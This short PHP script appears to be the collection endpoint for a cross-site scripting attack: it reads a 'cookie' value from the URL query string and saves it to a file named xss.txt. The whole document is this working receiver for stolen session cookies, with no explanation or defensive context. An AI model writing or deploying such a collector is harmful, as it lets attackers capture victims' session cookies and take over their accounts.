<?php
    $cookie=$_GET['cookie'];
    $save_file=fopen("/media/xss.txt","w");
    fwrite($save_file,$cookie);
    fclose($save_file);
?>